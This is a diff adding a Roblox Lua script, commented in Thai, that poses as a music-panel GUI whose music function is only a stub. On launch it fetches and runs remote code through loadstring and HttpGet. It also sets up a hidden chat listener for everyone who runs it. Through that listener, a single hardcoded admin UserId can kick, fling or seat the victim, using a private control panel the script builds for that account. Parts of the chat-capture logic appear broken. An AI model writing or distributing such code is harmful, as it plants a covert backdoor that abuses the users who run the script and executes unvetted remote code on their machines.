@@ -1,0 +1,233 @@
+-- == Rayfield Loader + Main Script ==
+-- ส่วนนี้ใช้โหลด Rayfield (วางไว้บรรทัดแรกของสคริป)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/loader.lua"))()
+
+-- กำหนด UserId ของแอดมิน (เปลี่ยนเป็น UserId จริงได้)
+local ADMIN_USER_ID = 1697390697  -- เปลี่ยนเป็น UserId ของคุณ
+local localPlayer = game.Players.LocalPlayer
+
+-- ตัวแปรสำหรับ Rayfield Window
+local RayfieldWindow = nil
+
+-- ฟังก์ชันสร้าง BillboardGui เหนือหัวแอดมิน
+local function createAdminBillboard()
+    -- ตรวจสอบว่าเป็นแอดมินหรือไม่
+    if localPlayer.UserId ~= ADMIN_USER_ID then return end
+    
+    -- รอ character โหลด
+    local character = localPlayer.Character
+    if not character then
+        localPlayer.CharacterAdded:Wait()
+        character = localPlayer.Character
+    end
+    
+    local head = character:WaitForChild("Head")
+    
+    -- สร้าง BillboardGui
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "AdminTag"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 150, 0, 40)
+    billboard.StudsOffset = Vector3.new(0, 2, 0)
+    billboard.AlwaysOnTop = true
+    
+    local textLabel = Instance.new("TextLabel", billboard)
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "ADMIN 191"
+    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    textLabel.TextStrokeTransparency = 0.3
+    textLabel.TextSize = 20
+    textLabel.Font = Enum.Font.GothamBold
+    
+    billboard.Parent = head
+end
+
+-- ฟังก์ชันสร้าง GUI เล่นเพลง (เหมือนเดิม)
+local function createMusicGUI()
+    -- ... (วางโค้ด MusicPanel_SkateBoard.lua ที่ตัดแต่งแล้วตรงนี้)
+    -- โค้ดส่วนนี้จะถูกแทรกจากไฟล์ต้นฉบับที่ไม่มีปุ่ม Bring และไม่มี Rayfield
+    -- แต่เนื่องจากโค้ดยาว ฉันจะใส่เฉพาะส่วนสำคัญ
+    print("สร้าง GUI เล่นเพลง")
+    -- (คุณสามารถวางโค้ด MusicPanel เต็มรูปแบบตรงนี้ได้)
+end
+
+-- ฟังก์ชัน监听 Chat (สำหรับทุกคนที่ใช้สคริป)
+local function setupChatListener()
+    local function onChatted(speaker, message)
+        -- ตรวจว่า message ขึ้นต้นด้วย "!" และผู้พูดเป็นแอดมิน
+        if string.sub(message, 1, 1) == "!" then
+            -- ตรวจสอบว่า speaker เป็นแอดมินจาก UserId
+            if speaker and speaker.UserId == ADMIN_USER_ID then
+                -- แยกคำสั่งและชื่อ
+                local cmd, targetName = string.match(message, "^!(%S+)%s+(.+)$")
+                if cmd and targetName then
+                    targetName = targetName:gsub("^%s*(.-)%s*$", "%1")
+                    
+                    -- ถ้าชื่อเป้าหมายตรงกับชื่อของเรา
+                    if targetName == localPlayer.Name then
+                        -- สั่ง Kick
+                        if cmd == "kick" then
+                            localPlayer:Kick("ถูกแอดมินเตะ")
+                        -- สั่ง Fling
+                        elseif cmd == "fling" then
+                            local character = localPlayer.Character
+                            if character and character:FindFirstChild("HumanoidRootPart") then
+                                local hrp = character.HumanoidRootPart
+                                local bodyVel = Instance.new("BodyVelocity")
+                                bodyVel.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+                                bodyVel.Velocity = Vector3.new(
+                                    math.random(-500, 500),
+                                    math.random(200, 500),
+                                    math.random(-500, 500)
+                                )
+                                bodyVel.Parent = hrp
+                                task.delay(0.5, function()
+                                    bodyVel:Destroy()
+                                end)
+                            end
+                        -- สั่ง Sit
+                        elseif cmd == "sit" then
+                            local character = localPlayer.Character
+                            if character and character:FindFirstChild("Humanoid") then
+                                character.Humanoid.Sit = true
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- 监听 SayMessageRequest (วิธีจับข้อความจากแชท)
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local chatEvent = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
+        chatEvent.SayMessageRequest.OnClientEvent:Connect(function(message, _, targetName)
+            -- สร้าง pseudo speaker จากข้อความ
+            -- (วิธีนี้จะได้ชื่อผู้พูดจาก targetName)
+            local player = game.Players:FindFirstChild(targetName)
+            if player then
+                onChatted(player, message)
+            end
+        end)
+    else
+        -- Fallback: 监听 Chatted (ใช้ได้แค่ในบางเกม)
+        localPlayer.Chatted:Connect(function(message)
+            -- ข้อความที่เราพิมพ์เองจะมาใน Chatted แต่ชื่อผู้พูดไม่มี
+            -- จึงต้องหาคนพูดจาก last sender (ไม่แม่นยำ)
+            -- แต่ถ้าใช้ SayMessageRequest จะดีกว่า
+            warn("ไม่พบ SayMessageRequest ใช้แค่ Chatted อาจทำงานไม่สมบูรณ์")
+        end)
+    end
+end
+
+-- ฟังก์ชันสร้าง Rayfield UI สำหรับแอดมินเท่านั้น
+local function createAdminUI()
+    if localPlayer.UserId ~= ADMIN_USER_ID then return end
+    
+    -- สร้าง Rayfield Window
+    RayfieldWindow = Rayfield:CreateWindow({
+        Name = "Admin Control",
+        Icon = 0,  -- ไอคอน (optional)
+        LoadingTitle = "Admin Panel",
+        LoadingSubtitle = "by 191",
+        Theme = "Default",
+    })
+    
+    local adminTab = RayfieldWindow:CreateTab("All Commands")
+    
+    -- ตัวแปรเก็บชื่อที่เลือกจาก Dropdown
+    local selectedPlayer = nil
+    
+    -- ฟังก์ชันอัปเดตรายชื่อผู้เล่นใน Dropdown
+    local function updatePlayerList()
+        local players = game.Players:GetPlayers()
+        local playerNames = {}
+        for _, plr in ipairs(players) do
+            table.insert(playerNames, plr.Name)
+        end
+        
+        return playerNames
+    end
+    
+    -- สร้าง Dropdown สำหรับเลือกผู้เล่น
+    local playerDropdown = adminTab:CreateDropdown({
+        Name = "Select Player",
+        Options = updatePlayerList(),
+        CurrentOption = nil,
+        Flag = "TargetPlayer",
+        Callback = function(option)
+            selectedPlayer = option
+        end
+    })
+    
+    -- อัปเดต Dropdown อัตโนมัติทุก 5 วินาที (ถ้าต้องการ)
+    task.spawn(function()
+        while true do
+            task.wait(5)
+            if playerDropdown and playerDropdown.SetOptions then
+                playerDropdown:SetOptions(updatePlayerList())
+            end
+        end
+    end)
+    
+    -- ปุ่ม Kick
+    adminTab:CreateButton({
+        Name = "Kick",
+        Callback = function()
+            if selectedPlayer then
+                local chatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                if chatService and chatService:FindFirstChild("SayMessageRequest") then
+                    chatService.SayMessageRequest:FireServer("!kick " .. selectedPlayer, "All")
+                else
+                    warn("ไม่พบ SayMessageRequest ไม่สามารถพิมพ์แชทได้")
+                end
+            end
+        end
+    })
+    
+    -- ปุ่ม Fling
+    adminTab:CreateButton({
+        Name = "Fling",
+        Callback = function()
+            if selectedPlayer then
+                local chatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                if chatService and chatService:FindFirstChild("SayMessageRequest") then
+                    chatService.SayMessageRequest:FireServer("!fling " .. selectedPlayer, "All")
+                end
+            end
+        end
+    })
+    
+    -- ปุ่ม Sit
+    adminTab:CreateButton({
+        Name = "Sit",
+        Callback = function()
+            if selectedPlayer then
+                local chatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                if chatService and chatService:FindFirstChild("SayMessageRequest") then
+                    chatService.SayMessageRequest:FireServer("!sit " .. selectedPlayer, "All")
+                end
+            end
+        end
+    })
+end
+
+-- ฟังก์ชันหลัก
+local function initialize()
+    -- สร้าง GUI เล่นเพลง (ให้ทุกคน)
+    createMusicGUI()  -- ใส่โค้ด Music Panel จริงๆ ตรงนี้
+    
+    -- ตั้งค่า监听 Chat (ให้ทุกคน)
+    setupChatListener()
+    
+    -- ถ้าเป็นแอดมิน ให้สร้าง Rayfield + Billboard
+    if localPlayer.UserId == ADMIN_USER_ID then
+        createAdminBillboard()
+        createAdminUI()
+    end
+end
+
+-- เริ่มทำงาน
+initialize()
